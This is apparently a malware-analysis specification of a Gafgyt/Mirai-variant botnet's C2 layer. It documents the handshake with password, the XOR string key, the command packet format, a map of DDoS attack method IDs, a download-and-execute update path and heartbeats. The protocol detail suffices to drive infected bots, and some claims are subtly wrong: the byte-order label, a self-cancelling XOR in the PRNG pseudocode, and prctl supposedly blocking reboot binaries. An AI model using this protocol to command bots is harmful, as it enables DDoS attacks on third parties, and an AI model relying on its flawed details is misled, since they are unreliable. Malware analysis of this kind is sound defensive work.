# Gafgyt (Hopto) Botnet — Communication Layer Technical Specification

## Binary Identification

| Property | Value |
|----------|-------|
| **Filename** | hopto |
| **Format** | ELF64 x86-64 |
| **Family** | Gafgyt/Mirai variant |
| **Analysis Target** | Communication Layer: Session Establishment, Authentication, Command Processing, ACKs/Keepalives |

---

## 1. Session Establishment

### 1.1 Observed Behavior

The malware establishes a C2 session through the following sequence:

#### 1.1.1 Pre-Connection Setup

1. **Single-Instance Controller Socket** (`fd_ctrl` at `0x0051c470`):
   - Creates a TCP socket: `socket(AF_INET, SOCK_STREAM, 0)`
   - Sets `SO_REUSEADDR` option
   - Sets `O_NONBLOCK` via `ioctl(FIONBIO)`
   - Binds to port `0x2099` (8345 decimal) on `127.0.0.1` or local IP
   - This socket is used for receiving kill signals from local clients

2. **Crypto Key Initialization** (`init_crypto_key` at `0x0040dc00`):
   ```c
   DAT_0051c9e0 = setsid();              // Session ID
   DAT_0051c9e4 = getpid() ^ gettid();   // PID XOR TID
   DAT_0051c9e8 = get_time_seed();       // Timestamp-based seed
   DAT_0051c9ec = DAT_0051c9e8 ^ DAT_0051c9e4;  // Combined seed
   ```
   These values seed the xorshift PRNG used throughout the binary.

3. **Password Extraction**:
   - If `argc == 2` and `strlen(argv[1]) < 0x20`:
     - Copy password to local buffer (`local_98`)
     - Copy password to global storage (`DAT_0051c9c0`)
     - Zero out `argv[1]` to hide from process listing

4. **C2 Address Resolution** (`resolve_c2_address` at `0x0040ce30`):
   - Retrieve C2 domain from string table entry #1 (via `table_retrieve_val(1)`)
   - Perform DNS resolution via custom `dns_resolve` function
   - Select random IP from resolved addresses using PRNG
   - Retrieve C2 port from string table entry #2 (via `table_retrieve_val(2)`)
   - Store in sockaddr structure at `DAT_0051eaa0`:
     - `sa_family = AF_INET (2)`
     - `sa_data[0..1]` = port (big-endian, default `0x5000` = 20480)
     - `sa_data[4..7]` = resolved IP address

#### 1.1.2 Connection & Handshake

After daemonization (fork + setsid), the main loop attempts C2 connection:

1. **Socket Creation** (when `DAT_0051c474 == -1`):
   ```c
   fd_c2 = socket(AF_INET, SOCK_STREAM, 0);
   setsockopt(fd_c2, SOL_SOCKET, SO_RCVTIMEO, {10, 0});    // 10s receive timeout
   setsockopt(fd_c2, SOL_SOCKET, SO_SNDTIMEO, {10, 0});    // 10s send timeout
   ioctl(fd_c2, FIONBIO, &1);                              // Set non-blocking
   ```

2. **DNS Resolution & Connection**:
   ```c
   if (PTR_resolve_callback != NULL) {
       PTR_resolve_callback();  // resolve_c2_address
   }
   DAT_0051c9bc = 1;            // Set connecting flag
   connect(fd_c2, &sockaddr_c2, 16);
   ```

3. **Handshake Transmission** (after connection success):
   The malware sends the following sequence to authenticate with C2:

   | Offset | Size | Content | Description |
   |--------|------|---------|-------------|
   | 0 | 4 bytes | `\x00\x00\x00\x01` | Protocol version/magic header (from `DAT_00419e80`) |
   | 4 | 1 byte | `strlen(password)` | Password length |
   | 5 | N bytes | `password` | C2 password from `argv[1]` (only if length > 0) |
   | 5+N | 1 byte | `table_retrieve_val(3)` | Protocol version byte (decrypted from string table) |

   **Exact transmission sequence** (from disassembly at `0x0040da0f`):
   ```c
   // 1. Get local IP and send 4-byte protocol header
   DAT_0051ea80 = get_local_ip();
   sendto(fd_c2, &DAT_00419e80, 4, MSG_DONTROUTE);  // \x00\x00\x00\x01

   // 2. Send password length (1 byte)
   password_len = strlen(c2_password);
   sendto(fd_c2, &password_len, 1, MSG_DONTROUTE);

   // 3. Send password bytes (if non-empty)
   if (password_len != 0) {
       sendto(fd_c2, c2_password, password_len, MSG_DONTROUTE);
   }

   // 4. Send protocol version byte from string table entry #3
   table_unlock_val(3);
   version_byte = table_retrieve_val(3, NULL);
   sendto(fd_c2, version_byte, 1, MSG_DONTROUTE);
   table_lock_val(3);
   ```

#### 1.1.3 Server Response Handling

After sending the handshake, the malware waits for a response:

1. **Read 2-byte length header** (big-endian):
   ```c
   recvfrom(fd_c2, &response_len, 2, MSG_DONTROUTE);
   ```

2. **Response processing**:
   - If `response_len == 0`: Read another 2 bytes and return to main loop (keepalive ping response)
   - If `response_len > 0x400`: Close connection and reconnect (invalid response)
   - If `0 < response_len <= 0x400`: Read `response_len` bytes as first data block

3. **Read second length header** (big-endian):
   ```c
   recvfrom(fd_c2, &second_len, 2, MSG_DONTROUTE);
   second_len = ntohs(second_len);
   ```

4. **Read second data block**:
   ```c
   recvfrom(fd_c2, &packet_buffer, second_len, MSG_DONTROUTE);
   ```

5. **Process command** (if `second_len != 0`):
   ```c
   if (second_len != 0) {
       process_c2_packet(packet_buffer, second_len);
   }
   ```

### 1.2 Handshake Logic Pseudocode

```
FUNCTION establish_c2_session():
    // Pre-connection setup
    fd_ctrl = socket(AF_INET, SOCK_STREAM, 0)
    setsockopt(fd_ctrl, SO_REUSEADDR, 1)
    ioctl(fd_ctrl, FIONBIO, 1)
    bind(fd_ctrl, "127.0.0.1:8345")
    
    // Initialize PRNG
    init_crypto_key()
    
    // Extract password from argv[1]
    IF argc == 2 AND strlen(argv[1]) < 0x20:
        c2_password = argv[1]
        memset(argv[1], 0, strlen(c2_password))  // Hide from process list
    
    // Daemonize
    IF fork() > 0:
        return 0  // Parent exits
    setsid()
    close(0); close(1); close(2)
    
    // Main loop
    fd_c2 = -1
    heartbeat_counter = 0
    
    LOOP:
        // Create connection if needed
        IF fd_c2 == -1:
            fd_c2 = socket(AF_INET, SOCK_STREAM, 0)
            setsockopt(fd_c2, SO_RCVTIMEO, {10, 0})
            setsockopt(fd_c2, SO_SNDTIMEO, {10, 0})
            ioctl(fd_c2, FIONBIO, 1)
            
            // Resolve C2 address
            resolve_c2_address()  // DNS lookup, random IP selection
            
            connecting_flag = TRUE
            connect(fd_c2, sockaddr_c2)
        
        // Wait for events (10s timeout)
        result = select(max(fd_ctrl, fd_c2) + 1, read_fds, write_fds, NULL, {10, 0})
        
        IF result == 0:
            // Timeout - send heartbeat
            heartbeat_counter++
            IF heartbeat_counter % 4 == 0:
                send(fd_c2, "\x00\x00", 2, MSG_DONTROUTE)
                IF send fails:
                    close(fd_c2)
                    fd_c2 = -1
                    sleep(1)
            CONTINUE
        
        IF fd_ctrl is readable:
            // Kill signal received on local control socket
            kill(-session_id, SIGKILL)
            exit(0)
        
        IF connecting_flag AND fd_c2 is writable:
            // Connection successful - send handshake
            connecting_flag = FALSE
            
            // Step 1: Protocol version header
            send(fd_c2, "\x00\x00\x00\x01", 4, MSG_DONTROUTE)
            
            // Step 2: Password length
            pwd_len = strlen(c2_password)
            send(fd_c2, &pwd_len, 1, MSG_DONTROUTE)
            
            // Step 3: Password (if non-empty)
            IF pwd_len > 0:
                send(fd_c2, c2_password, pwd_len, MSG_DONTROUTE)
            
            // Step 4: Protocol version byte
            version_byte = decrypt_string_table_entry(3)
            send(fd_c2, &version_byte, 1, MSG_DONTROUTE)
            CONTINUE
        
        IF fd_c2 is readable:
            // Receive and process C2 response
            recv(fd_c2, &first_len, 2, MSG_DONTROUTE)
            
            IF first_len == 0:
                // Keepalive response - read 2 more bytes and loop
                recv(fd_c2, &dummy, 2, MSG_DONTROUTE)
                CONTINUE
            
            IF first_len > 0x400:
                // Invalid response - reconnect
                close(fd_c2)
                fd_c2 = -1
                CONTINUE
            
            // Read first data block
            recv(fd_c2, &buffer, first_len, MSG_DONTROUTE)
            
            // Read second length header
            recv(fd_c2, &second_len, 2, MSG_DONTROUTE)
            second_len = ntohs(second_len)
            
            // Read second data block
            recv(fd_c2, &buffer, second_len, MSG_DONTROUTE)
            
            // Process command if non-empty
            IF second_len > 0:
                process_c2_packet(buffer, second_len)
```

### 1.3 Success/Failure Handling

| Condition | Behavior |
|-----------|----------|
| Connection timeout (10s) | Handled by `select()` timeout; continues retry loop |
| Handshake send failure | Close connection, set `fd_c2 = -1`, sleep 1s, retry |
| Server response length > 0x400 | Close connection, set `fd_c2 = -1`, retry |
| Server response length == 0 | Treated as keepalive; read 2 more bytes, continue loop |
| `recvfrom` errno == EAGAIN (11) or EINTR (4) | Retry connection (treat as transient error) |
| Any other `recvfrom` error | Close connection, sleep 1s, retry |
| Control socket (`fd_ctrl`) readable | Kill entire process group and exit |

### 1.4 Analysis Gaps

- **Server response format**: The binary does not validate the content of the first response block (only checks length). The server's authentication success/failure response structure is not explicitly validated in the client code.
- **String table entry #3 value**: The protocol version byte sent in the handshake is retrieved from the encrypted string table. Without runtime decryption, the exact byte value cannot be determined statically.
- **DNS resolution details**: The custom DNS resolver sends queries to `8.8.8.8:53` with a random transaction ID. The exact C2 domain name is stored in encrypted string table entry #1.

---

## 2. Cryptography

### 2.1 Observed Behavior

The malware uses two distinct cryptographic mechanisms:

1. **String Table XOR Encryption**: Used for obfuscating hardcoded strings (C2 domains, paths, command strings)
2. **xorshift PRNG**: Used for generating pseudo-random values for DNS queries, port selection, and network traffic randomization

**No encryption is applied to C2 communication traffic.** All data sent and received over the C2 socket is transmitted in plaintext (raw bytes with length-prefix framing).

### 2.2 String Table XOR Encryption

#### 2.2.1 Key Structure

The XOR key is stored at `DAT_0051c48c` (address `0x0051c48c`):

| Property | Value |
|----------|-------|
| **Key Address** | `0x0051c48c` |
| **Key Value** | `0xDEADBEEF` (3735928559 decimal) |
| **Key Size** | 4 bytes (32-bit) |
| **Byte Order** | Little-endian: `\xDE\xAD\xBE\xEF` |

#### 2.2.2 Encryption Algorithm

Each byte of the string is XORed with all four bytes of the key sequentially:

```
FUNCTION xor_decrypt(data_ptr, data_len, key):
    FOR i = 0 TO data_len - 1:
        data[i] = data[i] XOR (key & 0xFF)           // XOR with byte 0
        data[i] = data[i] XOR ((key >> 8) & 0xFF)    // XOR with byte 1
        data[i] = data[i] XOR ((key >> 16) & 0xFF)   // XOR with byte 2
        data[i] = data[i] XOR ((key >> 24) & 0xFF)   // XOR with byte 3
```

**Note**: Since XOR is its own inverse, `table_unlock_val` and `table_lock_val` perform the same operation — calling either function toggles between encrypted and decrypted states.

#### 2.2.3 String Table Structure

The string table is a fixed array of 16-byte entries at `DAT_0051eac0`:

```c
struct string_table_entry {
    uint64_t data_ptr;    // Offset 0: Pointer to malloc'd string data
    uint16_t data_len;    // Offset 8: Length of string data
    // 6 bytes padding
};
```

Each entry is accessed via index: `&DAT_0051eac0 + index * 0x10`

**Key String Table Indices**:

| Index | Purpose | Encrypted Data (first bytes) |
|-------|---------|------------------------------|
| 0 | C2 domain name | `0x00, 0x4D, 0x51, 0x44, ...` |
| 1 | C2 domain name (alt) | Same as index 0 |
| 2 | C2 port | `0x0C, 0x22` (2 bytes) |
| 3 | Protocol version byte | `0x43, 0x50, 0x41, 0x22` (4 bytes) |
| 4-0x4B | Various paths, strings | Various |
| 0x23-0x2B | Scanner watchdog strings | Various |
| 0x4F-0x69 | HTTP attack user-agents | Various |

#### 2.2.4 Decryption Routine Pseudocode

```
// String table entry structure (16 bytes each)
STRUCT StringEntry:
    ptr: uint64      // Pointer to string data
    len: uint16      // Length of string

GLOBAL XOR_KEY = 0xDEADBEEF
GLOBAL STRING_TABLE_BASE = 0x0051eac0

FUNCTION table_unlock_val(index):
    entry_offset = index * 0x10
    entry_ptr = STRING_TABLE_BASE + entry_offset
    data_ptr = *(uint64*)entry_ptr
    data_len = *(uint16*)(entry_ptr + 8)
    
    IF data_len == 0:
        RETURN
    
    FOR i = 0 TO data_len - 1:
        byte_addr = data_ptr + i
        *(uint8*)byte_addr = *(uint8*)byte_addr XOR (XOR_KEY & 0xFF)
        *(uint8*)byte_addr = *(uint8*)byte_addr XOR ((XOR_KEY >> 8) & 0xFF)
        *(uint8*)byte_addr = *(uint8*)byte_addr XOR ((XOR_KEY >> 16) & 0xFF)
        *(uint8*)byte_addr = *(uint8*)byte_addr XOR ((XOR_KEY >> 24) & 0xFF)

FUNCTION table_lock_val(index):
    // Identical to table_unlock_val (XOR is self-inverse)
    table_unlock_val(index)

FUNCTION table_retrieve_val(index, out_len):
    entry_offset = index * 0x10
    IF out_len != NULL:
        *out_len = *(uint16*)(STRING_TABLE_BASE + entry_offset + 8)
    RETURN *(uint64*)(STRING_TABLE_BASE + entry_offset)
```

### 2.3 xorshift PRNG

#### 2.3.1 State Variables

| Address | Purpose |
|---------|---------|
| `DAT_0051c9e0` | State[0] — initialized from `setsid()` return |
| `DAT_0051c9e4` | State[1] — initialized from `getpid() ^ gettid()` |
| `DAT_0051c9e8` | State[2] — initialized from timestamp |
| `DAT_0051c9ec` | State[3] — initialized from `State[2] ^ State[1]` |

#### 2.3.2 Algorithm (`rand_xorshift` at `0x0040dbb0`)

```c
FUNCTION rand_xorshift():
    temp = State[2]
    
    // Compute new State[3]
    State[3] = (State[0] << 11) XOR State[0]
    State[3] = (State[3] >> 8) XOR State[3] XOR State[3] XOR (State[3] >> 19)
    
    // Rotate states
    State[0] = State[1]
    State[1] = temp
    State[2] = State[3]
    
    RETURN (State[3] >> 8) XOR State[3] XOR State[3] XOR (State[3] >> 19)
```

**Optimized form**:
```
FUNCTION rand_xorshift():
    t = State[0] XOR (State[0] << 11)
    State[0] = State[1]
    State[1] = State[2]
    State[2] = State[3]
    State[3] = (t >> 8) XOR t XOR State[3] XOR (State[3] >> 19)
    RETURN State[3]
```

#### 2.3.3 Bounded Random (`rand_lfsr` at `0x0040dc40`)

```c
FUNCTION rand_lfsr(min, max):
    rand_xorshift()  // Advance PRNG state
    RETURN min + 1 + (State[3] % (max - min))
```

### 2.4 Network Traffic Encryption

**Finding**: No encryption is applied to C2 communication. All packets are transmitted in plaintext.

- **Outbound handshake**: Sent as raw bytes (version header + password length + password + version byte)
- **Inbound commands**: Received as raw bytes with length-prefix framing
- **Heartbeat**: Raw `\x00\x00` bytes
- **Outbound responses**: None observed (malware does not send acknowledgments)

### 2.5 Analysis Gaps

- **Exact string table contents**: Without runtime execution, the decrypted values of string table entries cannot be confirmed. The XOR key `0xDEADBEEF` is observed at `0x0051c48c` but the actual runtime key may differ if modified at load time.
- **String table entry #3 (protocol version)**: The exact byte value sent during handshake depends on the decrypted content of this entry.

---

## 3. Main Command Loop

### 3.1 Observed Behavior

The main command loop operates as a `select()`-based event loop with the following structure:

#### 3.1.1 Event Loop Structure

```c
heartbeat_counter = 0

LOOP:
    // Clear fd_sets
    FD_ZERO(read_fds)
    FD_ZERO(write_fds)
    
    // Add control socket to read set
    IF fd_ctrl != -1:
        FD_SET(fd_ctrl, read_fds)
    
    // Create C2 socket if not connected
    IF fd_c2 == -1:
        fd_c2 = create_socket()
        set_nonblocking(fd_c2)
        resolve_c2_address()
        connecting_flag = TRUE
        connect(fd_c2, sockaddr_c2)
    
    // Add C2 socket to appropriate fd_set
    IF connecting_flag:
        FD_SET(fd_c2, write_fds)    // Wait for connection completion
    ELSE:
        FD_SET(fd_c2, read_fds)     // Wait for data
    
    // Select with 10-second timeout
    max_fd = max(fd_ctrl, fd_c2)
    result = select(max_fd + 1, read_fds, write_fds, NULL, {10, 0})
    
    IF result == 0:
        // Timeout — heartbeat handling
        handle_timeout()
        CONTINUE
    
    IF result == -1:
        CONTINUE  // Retry on error
    
    // Handle events
    handle_control_socket()
    handle_c2_connection()
    handle_c2_data()
```

#### 3.1.2 `process_c2_packet` Function (at `0x00402310`)

This function parses and dispatches C2 commands. The packet structure is:

```
+--------+--------+--------+--------+--------+--------+
| Offset |  0-3   |   4    |   5    |  6..N  |  N..   |
| Field  | duration | method | target | targets | options |
| Size   | 4 bytes | 1 byte | count  | M*5    | remaining |
| Type   | uint32  | int8   | uint8  | array  | array   |
+--------+--------+--------+--------+--------+--------+
```

**Detailed Packet Format**:

| Offset | Size | Field | Type | Description |
|--------|------|-------|------|-------------|
| 0 | 4 | `duration` | uint32 | Attack duration in seconds |
| 4 | 1 | `method_id` | int8 | Attack method identifier (-1 = stop, -2 = update) |
| 5 | 1 | `target_count` | uint8 | Number of targets |
| 6 | 5 × target_count | `targets[]` | struct | Target array |
| 6 + 5×targets | 1 | `option_count` | uint8 | Number of options |
| 7 + 5×targets | Remaining | `options[]` | struct | Option array |

**Target Entry Structure** (5 bytes each):

| Offset | Size | Field | Type | Description |
|--------|------|-------|------|-------------|
| 0 | 4 | `ip` | uint32 | Target IP address (network byte order) |
| 4 | 1 | `cidr` | uint8 | CIDR netmask |

**Option Entry Structure** (variable, parsed sequentially):

| Offset | Size | Field | Type | Description |
|--------|------|-------|------|-------------|
| 0 | 1 | `option_id` | uint8 | Option identifier |
| 1 | 1 | `option_len` | uint8 | Length of option value |
| 2 | option_len | `option_val` | byte[] | Option string value |

**Special Method IDs**:

| Method ID | Behavior |
|-----------|----------|
| `-1` (0xFF) | Stop all running attacks: `kill(DAT_0051c9a0, SIGKILL)` |
| `-2` (0xFE) | Download and execute update: `download_and_exec_update(packet_data + 5)` |

**Attack Dispatch** (`attack_start` at `0x00402190`):

```c
FUNCTION attack_start(duration, method_id, target_count, targets, option_count, options):
    // Fork supervisor process
    pid = fork()
    IF pid == 0:
        // Fork timer process (grandchild)
        timer_pid = fork()
        IF timer_pid == 0:
            // Timer process
            sleep(duration)
            kill(getppid(), SIGKILL)  // Kill supervisor
            exit(0)
        
        // Supervisor process — find and execute attack method
        FOR each registered attack method:
            IF method.id == method_id:
                method.func(target_count, targets, option_count, options)
                // Infinite loop — attack runs until killed by timer
        exit(0)
    
    // Parent process — track attack PID
    IF DAT_0051c9a0 == 0:
        DAT_0051c9a0 = pid
```

### 3.2 Protocol Specification

#### 3.2.1 Wire Format

C2 commands use a **double-length-prefix framing** protocol:

```
[2 bytes: first_len (big-endian)] [first_len bytes: first_data]
[2 bytes: second_len (big-endian)] [second_len bytes: second_data]
```

**Framing Details**:

| Field | Size | Encoding | Description |
|-------|------|----------|-------------|
| `first_len` | 2 bytes | Big-endian uint16 | Length of first data block |
| `first_data` | first_len bytes | Raw | First data block (content not used by client) |
| `second_len` | 2 bytes | Big-endian uint16 | Length of command data |
| `second_data` | second_len bytes | Raw | Command payload passed to `process_c2_packet` |

**Constraints**:
- `first_len > 0x400` → Connection closed and reconnected
- `second_len == 0` → No command processing occurs

#### 3.2.2 Command Payload Structure

The command payload (`second_data`) format:

```
+--------+--------+--------+--------+--------+
| Offset |  0-3   |   4    |   5    |  6..   |
| Field  | duration | method | target | targets + |
|        |        |  ID    | count  | options  |
+--------+--------+--------+--------+--------+
```

**Duration**: 32-bit unsigned integer (seconds). Passed directly to `sleep()` in the timer process.

**Method ID**: 8-bit signed integer. Maps to registered attack methods.

**Target Count**: 8-bit unsigned integer. Number of target entries.

**Target Entries**: Each 5 bytes:
- Bytes 0-3: Target IP (uint32, network byte order)
- Byte 4: CIDR netmask (uint8)

**Option Count**: 8-bit unsigned integer (follows targets).

**Option Entries**: Variable-length entries parsed sequentially:
- Byte 0: Option ID (uint8)
- Byte 1: Option value length (uint8)
- Bytes 2 to 2+len-1: Option value string (byte[])
- Next option starts at byte 2+len

#### 3.2.3 Attack Method Registry

Attack methods are dynamically registered in `attack_init()` (at `0x00402620`). Each registration allocates a structure containing a function pointer and method ID:

```c
struct attack_method {
    void (*func)(uint target_count, void *targets, uint option_count, void *options);
    char method_id;
};
```

**Complete Method ID to Function Mapping**:

| Method ID (Hex) | Function | Attack Type |
|-----------------|----------|-------------|
| `0x00` | `attack_tcp_syn` | TCP SYN Flood |
| `0x01` | `attack_tcp_dns` | TCP DNS Amplification |
| `0x02` | `attack_tcp_randflag` | TCP Random Flag Flood |
| `0x03` | `attack_tcp_random` | TCP Random Attack |
| `0x04` | `attack_tcp_multi_flag` | TCP Multi-Flag Flood |
| `0x05` | `attack_tcp_stomp` | TCP Stomp |
| `0x06` | `attack_method_hexflood` | TCP Hex Flood |
| `0x07` | `attack_method_stdhex` | TCP Standard Hex Flood |
| `0x08` | `attack_method_nudp` | NUDP Flood |
| `0x09` | `attack_method_udphex` | UDP Hex Flood |
| `0x0a` | `attack_tcp_xmas` | TCP Xmas Flood |
| `0x0b` | `LAB_00406590` (unnamed) | TCP Unknown |
| `0x0c` | `attack_method_http_flood` | HTTP Flood |
| `0x0d` | `attack_mixed_protocol` | Mixed Protocol Attack |
| `0x0e` | `attack_method_ovhdrop` | OVH Drop Flood |
| `0x0f` | `attack_method_nfo` | NFO Flood |
| `0x10` | `attack_method_ovh_raw` | OVH Raw Flood |
| `0x11` | `attack_method_nfo2` | NFO v2 Flood |
| `0x12` | `attack_udp_ndnp` | UDP NDNP Flood |
| `0x13` | `attack_method_nmem` | NMEM Attack |
| `0x14` | `attack_method_nmsg` | NMSG Attack |
| `0x15` | `attack_method_nucg` | NUCG Attack |
| `0x16` | `attack_method_twamp` | TWAMP Attack |
| `0x17` | `attack_tcp_ovh` | TCP OVH Bypass |
| `0x18` | `attack_tcp_options` | TCP Options Flood |
| `0x19` | `attack_teamspeak_udp` | Teamspeak UDP Flood |
| `0x1a` | `attack_method_ovh_tcp` | OVH TCP Flood |
| `0x1b` | `attack_tcp_bypass` | TCP Bypass Flood |
| `0x1c` | `attack_method_ssdp` | SSDP Flood |
| `0x1d` | `attack_method_dns` | DNS Flood |
| `0x1e` | `attack_method_udp_custom` | UDP Custom Flood |
| `0x1f` | `attack_method_tla` | TLA Attack |
| `0x20` | `attack_method_http` | HTTP Attack |
| `0x21` | `attack_tcp_syn_proxy` | TCP SYN Proxy Flood |
| `0x22` | `attack_method_sla` | SLA Attack |
| `0x26` | `attack_method_mysql` | MySQL Flood |
| `0x28` | `attack_method_teamspeak` | Teamspeak Attack |
| `0x2a` | `attack_method_udpflood` | UDP Flood |

**Special Method IDs**:

| Method ID (Hex) | Behavior |
|-----------------|----------|
| `0xFF` (-1) | Kill all running attacks |
| `0xFE` (-2) | Download and execute update binary |

#### 3.2.4 Option ID Reference

Options are identified by single-byte IDs. The following option IDs are observed in attack functions:

| Option ID | Usage Context | Description |
|-----------|---------------|-------------|
| `0x00` | Multiple attacks | Packet size / payload length |
| `0x01` | Multiple attacks | Boolean flag |
| `0x06` | Hexflood, etc. | Source port |
| `0x07` | Hexflood, etc. | Target port |
| `0x08` | HTTP attack | Host header value |
| `0x14` | HTTP attack | User-Agent header |
| `0x15` | HTTP attack | Request count |
| `0x16` | HTTP attack | Path/URI |
| `0x18` | HTTP attack | Thread/concurrency count |

### 3.3 Message Processing Logic Pseudocode

```
FUNCTION process_c2_packet(packet_data, packet_len):
    // Validate minimum packet size
    IF packet_len < 4:
        RETURN
    
    duration = *(uint32*)packet_data          // Bytes 0-3
    method_id = *(int8*)(packet_data + 4)     // Byte 4
    
    // Handle special commands
    IF method_id == -1:
        // Stop all attacks
        IF attack_pid != 0:
            kill(attack_pid, SIGKILL)
        attack_pid = 0
        RETURN
    
    IF method_id == -2:
        // Download and execute update
        download_and_exec_update(packet_data + 5, packet_len - 5)
        RETURN
    
    IF packet_len == 4:
        RETURN  // No data beyond duration
    
    // Parse targets
    target_count = *(uint8*)(packet_data + 5)  // Byte 5
    IF target_count == 0:
        RETURN
    
    remaining = packet_len - 6
    IF remaining < target_count * 5:
        RETURN  // Insufficient data for targets
    
    // Allocate and populate target array
    targets = calloc(target_count, 24)  // 24 bytes per target struct
    FOR i = 0 TO target_count - 1:
        target_ip = *(uint32*)(packet_data + 6 + i * 5)
        target_cidr = *(uint8*)(packet_data + 6 + i * 5 + 4)
        targets[i].ip = target_ip
        targets[i].cidr = target_cidr
    
    // Parse options
    remaining = remaining - target_count * 5
    IF remaining == 0:
        option_count = 0
        options = NULL
    ELSE:
        option_count = *(uint8*)(packet_data + 6 + target_count * 5)
        IF option_count == 0:
            options = NULL
        ELSE:
            options = calloc(option_count, 16)
            offset = 6 + target_count * 5 + 1
            FOR i = 0 TO option_count - 1:
                option_id = *(uint8*)(packet_data + offset)
                option_len = *(uint8*)(packet_data + offset + 1)
                option_val = malloc(option_len + 1)
                memcpy(option_val, packet_data + offset + 2, option_len)
                option_val[option_len] = '\0'
                options[i].val = option_val
                options[i].id = option_id
                offset = offset + 2 + option_len
    
    // Dispatch attack
    attack_start(duration, method_id, target_count, targets, option_count, options)
    
    // Cleanup
    IF targets != NULL:
        free(targets)
    IF options != NULL:
        FOR each option:
            IF option.val != NULL:
                free(option.val)
        free(options)
```

### 3.4 Update Mechanism (`download_and_exec_update` at `0x0040f7c0`)

When `method_id == -2`, the update payload is parsed as:

| Offset | Size | Field | Description |
|--------|------|-------|-------------|
| 0 | 1 | `server_len` | Length of C2 server address |
| 1 | server_len | `server_addr` | C2 server IP/domain |
| 1+server_len | 1 | `path_len` | Length of path component |
| 2+server_len | path_len | `path` | Path on C2 server |
| 2+server_len+path_len | 1 | `filename_len` | Length of binary filename |
| 3+server_len+path_len | filename_len | `filename` | Name for downloaded binary |

The update downloads the binary using one of: `wget`, `curl`, `tftp`, or `ftpget`. After successful download, it renames itself using `prctl(PR_SET_NAME)` and executes the new binary via `execve`.

---

## 4. ACKs & Keepalives

### 4.1 Observed Behavior

The malware implements a simple heartbeat mechanism but does **not** send explicit command acknowledgments or execution status reports.

#### 4.1.1 Heartbeat / Keepalive

**Heartbeat Payload**:
- Raw bytes: `\x00\x00` (2 bytes, both zero)
- Sent via `sendto(fd_c2, "\x00\x00", 2, MSG_DONTROUTE)`

**Heartbeat Timing**:
- The `select()` loop uses a **10-second timeout**
- A global counter (`heartbeat_counter` / `uVar3`) increments on each timeout
- A heartbeat is sent every **4 timeouts** = **40 seconds**
- Condition: `IF (heartbeat_counter & 3) == 0`

**Heartbeat Failure Handling**:
- If `sendto` returns -1 (error):
  - Close C2 socket: `close(fd_c2)`
  - Reset C2 socket: `fd_c2 = -1`
  - Sleep 1 second: `sleep(1)`
  - Return to main loop (will attempt reconnect)

#### 4.1.2 Server Keepalive Response

When the server responds with a 2-byte value of `\x00\x00`:
- The client reads the 2-byte length header
- Sees `first_len == 0`
- Reads another 2 bytes (discarded)
- Returns to the main loop without processing a command

This appears to be the server's way of acknowledging the client's heartbeat or sending a no-op.

#### 4.1.3 System Command Disabling

Every **30 iterations** of the main loop (`DAT_0051c9b4 % 0x1e == 0`), the malware calls `disable_system_commands()` which uses `prctl(PR_SET_DUMPABLE, 0)` on a list of system binary paths:

```c
// Paths protected by prctl:
"/sbin/reboot", "/usr/sbin/reboot", "/bin/reboot"
"/sbin/shutdown", "/usr/sbin/shutdown", "/bin/shutdown"
"/sbin/poweroff", "/usr/sbin/poweroff", "/bin/poweroff"
"/sbin/halt", "/usr/sbin/halt", "/bin/halt"
"/sbin/restart", "/usr/sbin/restart", "/bin/restart"
"/sbin/init", "/usr/sbin/init", "/bin/init"
"/sbin/sysinit", "/usr/sbin/sysinit", "/bin/sysinit"
"/sbin/single", "/usr/sbin/single", "/bin/single"
"/sbin/sulogin", "/usr/sbin/sulogin", "/bin/sulogin"
"/sbin/mingetty", "/usr/sbin/mingetty", "/bin/mingetty"
"/sbin/getty", "/usr/sbin/getty", "/bin/getty"
"/usr/sbin/agetty", "/bin/agetty"
"/sbin/runlevel", "/usr/sbin/runlevel", "/bin/runlevel"
```

This prevents administrators from using these commands to reboot or shut down the infected device.

### 4.2 Response Packet Formats

#### 4.2.1 Heartbeat Packet

```
+--------+--------+
| Byte 0 | Byte 1 |
| 0x00   | 0x00   |
+--------+--------+
```

- **Direction**: Client → Server
- **Interval**: Every 40 seconds (4 × 10-second select timeouts)
- **Purpose**: Keepalive / connection health check

#### 4.2.2 Command Acknowledgments

**Finding**: No command acknowledgment packets are sent by the malware. The C2 protocol is unidirectional for commands — the server sends commands, and the client executes them without sending any confirmation.

#### 4.2.3 Status Reports

**Finding**: No periodic or event-driven status reports are transmitted to the C2 server. The malware does not send:
- Attack completion notifications
- System information or telemetry
- Error reports
- Victim identification data

### 4.3 Feedback Logic Pseudocode

```
GLOBAL heartbeat_counter = 0
GLOBAL fd_c2 = -1

FUNCTION main_loop_iteration():
    result = select(max_fd + 1, read_fds, write_fds, NULL, {10, 0})
    
    IF result == 0:
        // Timeout — heartbeat handling
        heartbeat_counter++
        
        IF (heartbeat_counter & 3) == 0:
            // Every 4 timeouts (40 seconds)
            send_result = sendto(fd_c2, "\x00\x00", 2, MSG_DONTROUTE)
            
            IF send_result == -1:
                close(fd_c2)
                fd_c2 = -1
                sleep(1)
                RETURN
        
        // Periodic system command disabling (every 30 iterations)
        IF (loop_counter % 0x1e) == 0:
            disable_system_commands()
        
        RETURN
    
    // ... handle fd events ...

FUNCTION handle_c2_response():
    recvfrom(fd_c2, &first_len, 2, MSG_DONTROUTE)
    
    IF first_len == 0:
        // Server keepalive — read 2 more bytes and discard
        recvfrom(fd_c2, &dummy, 2, MSG_DONTROUTE)
        RETURN  // No command to process
    
    IF first_len > 0x400:
        // Invalid — reconnect
        close(fd_c2)
        fd_c2 = -1
        RETURN
    
    // Read first data block
    recvfrom(fd_c2, &first_buffer, first_len, MSG_DONTROUTE)
    
    // Read second length header
    recvfrom(fd_c2, &second_len, 2, MSG_DONTROUTE)
    second_len = ntohs(second_len)
    
    // Read second data block (actual command)
    recvfrom(fd_c2, &command_buffer, second_len, MSG_DONTROUTE)
    
    // Process command (no ACK sent back)
    IF second_len > 0:
        process_c2_packet(command_buffer, second_len)
```

### 4.4 Session Lifecycle

| Phase | Trigger | Behavior |
|-------|---------|----------|
| **Initial Connection** | `fd_c2 == -1` | Create socket, resolve DNS, connect to C2 |
| **Handshake** | Connection established | Send protocol header + password + version byte |
| **Active Session** | Handshake complete | Enter `select()` loop, process commands |
| **Keepalive** | Every 40 seconds | Send `\x00\x00` heartbeat |
| **Connection Failure** | Send/recv error | Close socket, sleep 1s, reconnect |
| **Invalid Response** | Length > 0x400 | Close socket, reconnect |
| **Kill Signal** | Control socket readable | Kill process group, exit |
| **Update** | `method_id == -2` | Download new binary, `execve` to replace self |

### 4.5 Analysis Gaps

